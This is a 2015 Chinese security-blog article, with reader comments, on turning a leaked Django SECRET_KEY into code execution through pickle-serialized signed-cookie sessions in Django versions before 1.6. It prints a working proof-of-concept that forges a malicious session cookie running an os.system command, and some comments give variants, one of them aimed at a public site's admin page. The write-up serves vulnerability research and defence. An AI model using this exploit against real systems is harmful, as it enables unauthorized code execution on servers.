<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">从django的SECRET_KEY到代码执行</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">xxlegend</a> <span class="bull">·</span> <time title="2015/09/08 18:29" ui-time="" datetime="2015/09/08 18:29" class="published ng-binding ng-isolate-scope">2015/09/08 18:29</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 背景</h1><hr><p>最近审查代码发现某些产品在登录的<code>JS</code>代码中泄露了<code>SECRET_KEY</code>,将该值作为密码加密的盐，这样就暴露了加密<code>salt</code>不太好吧，更重要的是对<code>django</code>的安全造成了极大的威胁。</p><h1>0x01 SECRET_KEY作用</h1><hr><p><code>SECTET_KEY</code>在<code>djanog</code>中使用非常广泛，基本上涉及到安全，加密等的地方都用到了，下面列举一些常见情景：</p><p>1，<code>json object</code>的签名</p><p>2，加密函数，如密码重置，表单，评论，<code>csrf</code>的<code>key</code>，<code>session</code>数据</p><p>这里面就要重点讲到<code>session</code>的问题，在这里使用不当就会导致代码执行</p><h1>0x02 代码执行</h1><hr><h3>2.1 settings的session设置</h3><p><code>django</code>默认存储<code>session</code>到数据库中，但是可能会比较慢，就会使用到缓存，文件，还有<code>cookie</code>等方式，如果采用了<code>cookie</code>机制则有可能代码执行，settings配置如下：</p><pre><code>SESSION_ENGINE = 'django.contrib.sessions.backends.signed_cookies'
</code></pre><h3>2.2 django 1.6以下</h3><p>在<code>django1.6</code>以下，<code>session</code>默认是采用<code>pickle</code>执行序列号操作，在<code>1.6</code>及以上版本默认采用<code>json</code>序列化。代码执行只存在于使用<code>pickle</code>序列话的操作中。</p><h3>2.3 session处理流程</h3><p>可以简单的分为两部分，<code>process_request</code>和<code>process_response</code>,前者负责选择<code>session</code>引擎，初始化<code>cookie</code>数据。见代码</p><pre><code>#!python
class SessionMiddleware(object):
    def process_request(self, request):
        engine = import_module(settings.SESSION_ENGINE)
        session_key = request.COOKIES.get(settings.SESSION_COOKIE_NAME, None)
        request.session = engine.SessionStore(session_key)
</code></pre><p><code>process_response</code>则是处理返回给用户的<code>cookie</code>信息，比如修改过期时间等。在将<code>session</code>存入缓存后，可能在某个操作中会用到<code>session</code>信息，这个时候就会通过反序列化操作从缓存中取，如果反序列话引擎是采用<code>pickle</code>机制的话就存在代码执行。反序列化的代码位于<code>django.core.signing.py</code>中，这个模块主要是一些签名，加解密操作，同时也包含序列化和反序列化，默认采用<code>JSON</code>引擎，下面是反序列话<code>loads</code>的代码：</p><pre><code>#!python
def loads(s, key=None, salt='django.core.signing', serializer=JSONSerializer, max_age=None):
    """
    Reverse of dumps(), raises BadSignature if signature fails
    """
    base64d = smart_str(
        TimestampSigner(key, salt=salt).unsign(s, max_age=max_age))
    decompress = False
    if base64d[0] == '.':
        # It's compressed; uncompress it first
        base64d = base64d[1:]
        decompress = True
    data = b64_decode(base64d)
    if decompress:
        data = zlib.decompress(data)
    return serializer().loads(data)
</code></pre><h3>2.4 构造POC</h3><pre><code>#!python
import os
os.environ.setdefault('DJANGO_SETTINGS_MODULE','settings')
from django.conf import settings
from django.core import signing
from django.contrib.sessions.backends import signed_cookies


class Run(object):
    def __reduce__(self):
        return (os.system,('touch /tmp/xxlegend.log',))

sess = signing.dumps(Run(), serializer=signed_cookies.PickleSerializer,salt='django.contrib.sessions.backends.signed_cookies')
print sess

import urllib2
import cookielib

url = 'http://10.24.35.228:8000/favicon.ico'
headers = {'Cookie':'sessionid="%s"' %(sess)}
request = urllib2.Request(url,headers = headers)
response = urllib2.urlopen(request)
print response.read()
</code></pre><p>通过序列化<code>Run</code>类，实现创建一个文件的操作，在反序列化的时候执行这个操作。执行代码完成可看到在<code>/tmp</code>目录创建<code>xxlegend.log</code>文件，同时<code>web</code>报<code>500</code>错误。</p><h1>0x03 总结</h1><hr><p>利用条件总结起来就是这么几句话，首先泄露了<code>SECRET_KEY</code>,其次<code>session</code>引擎采用了<code>signed_cookies</code>,<code>django</code>版本小于<code>1.6</code>即存在代码执行问题。同样的问题也存在于<code>python</code>的其他<code>web</code>框架中，如<code>flask</code>，<code>bottle</code>。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/papers/6077" rel="bookmark" id="re1">PHP multipart/form-data 远程DOS漏洞</a></li><li><a href="http://drops.wooyun.org/papers/66" rel="bookmark" id="re2">Python Pickle反序列化带来的安全问题</a></li><li><a href="http://drops.wooyun.org/papers/1321" rel="bookmark" id="re3">wechall mysql关卡题解</a></li><li><a href="http://drops.wooyun.org/web/7490" rel="bookmark" id="re4">python 安全编码&amp;代码审计</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">qewrwqer</span> <span class="reply-time">2015-12-09 10:44:25</span></div><p></p><p>adfadsf</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">日出东方</span> <span class="reply-time">2015-11-27 11:55:23</span></div><p></p><p>这个poc 怎么用？直接用python执行吗？还是得搭建django服务器。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">liyang</span> <span class="reply-time">2015-09-18 21:18:27</span></div><p></p><p>可以参考这个 Python Pickle反序列化带来的安全问题</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">uhayate</span> <span class="reply-time">2015-09-11 15:29:11</span></div><p></p><p>肿么回事，加密的盐2333</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xxlegend</span> <span class="reply-time">2015-09-11 10:47:30</span></div><p></p><p>@宁采臣 1.5版本上，SERIALIZER是从settings.py引入的，https://github.com/django/django/blob/stable/1.5.x/django/conf/global_settings.py 可查看SessionBase的实现，__init__函数如下<br>def __init__(self, session_key=None):<br>self._session_key = session_key<br>self.accessed = False<br>self.modified = False<br>self.serializer = import_by_path(settings.SESSION_SERIALIZER)<br>详情看<br>https://github.com/django/django/blob/stable/1.5.x/django/contrib/sessions/backends/base.py</p><p>把serializer 设为&#039;django.contrib.sessions.serializers.PickleSerializer&#039; 应该就ok了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">宁采臣</span> <span class="reply-time">2015-09-10 19:14:33</span></div><p></p><p>@xxlegend 感谢楼主看了我排版这么乱的代码 还解答了我的问题 -_- %00<br>signed_cookies.py里面只有SessionStore这个类，而代码中用到了serializer=signed_cookies.PickleSerializer，会报错说没有PickleSerializer<br>另外time模块在__reduce__函数里面有包含啦，我在另外的代码上只用cPickle是有效的<br>我觉得我应该是环境没搭好</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xxlegend</span> <span class="reply-time">2015-09-10 17:47:48</span></div><p></p><p>@ModNar 可能一些公开的源码网址，如githhub，stackoverflow等，还有就是利用任意文件读取，下载，ssrf等漏洞去获取</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ModNar</span> <span class="reply-time">2015-09-10 16:06:29</span></div><p></p><p>一般会泄露成什么形式？什么需求场景下可能泄露？求实际案例？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xxlegend</span> <span class="reply-time">2015-09-10 10:00:53</span></div><p></p><p>@宁采臣 两个问题，1：这是github上1.5版本django的源码地址，https://github.com/django/django/tree/stable/1.5.x/django/contrib/sessions/backends 有signed_cookies.py<br>2：&quot;eval，(&#039;time.sleep(10)&#039;)&quot; 反序列化的过程会报time不存在吧，换成这个In [5]: class run1(object):<br>...: def __reduce__(self):<br>...: return (os.system, (&#039;sleep 5&#039;,))</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">宁采臣</span> <span class="reply-time">2015-09-09 23:30:14</span></div><p></p><p>找了很多版本并没有signed_cookies.PickleSerializer这个类<br>反而这样就可以了：from django.contrib.sessions.serializers import PickleSerializer<br>令其执行eval(&quot;sleep(10)&quot;) 并没有找到有效的网址<br>自己搭了个最简单的mysite工程运行POC也并没有延迟的效果，版本是1.5.5<br>不知道还要再配置什么 求楼主提示</p><p>附上我的代码：<br># coding=utf-8</p><p>import os<br>os.environ.setdefault(&#039;DJANGO_SETTINGS_MODULE&#039;,&#039;settings&#039;)<br>from django.conf import settings<br>from django.core import signing<br>from django.contrib.sessions.backends import signed_cookies<br>from django.contrib.sessions.serializers import PickleSerializer<br>import requests<br>import time</p><p>class Run(object):<br>def __reduce__(self):<br>import time<br>return (eval,(&#039;time.sleep(10)&#039;,))</p><p>sess = signing.dumps(Run(), serializer=PickleSerializer,salt=&#039;django.contrib.sessions.backends.signed_cookies&#039;)<br>print sess</p><p>headers = {<br>&#039;Cookie&#039;:&#039;sessionid=&quot;%s&quot;&#039; % sess<br>}<br>s = time.time()<br>resp = requests.get(&quot;http://www.ieok.com/admin/&quot;, headers=headers)<br>e = time.time()<br>print e -s</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夸父追日</span> <span class="reply-time">2015-09-09 14:30:38</span></div><p></p><p>@瞌睡龙 虽然下午了还没发~ 哈哈赶紧写篇二进制文章压压惊</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2015-09-09 01:11:13</span></div><p></p><p>@夸父追日 骚年莫要慌，你的文章天亮发</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">sin</span> <span class="reply-time">2015-09-09 00:48:22</span></div><p></p><p>6666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夸父追日</span> <span class="reply-time">2015-09-08 20:46:44</span></div><p></p><p>@xsser 知识库上一定要这样的牛逼文章才能通过么? %&gt;.&lt;% 文章没过也告诉一下呀~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser</span> <span class="reply-time">2015-09-08 19:48:10</span></div><p></p><p>求案例上乌云</p><p></p></div></div></div></div></div></main>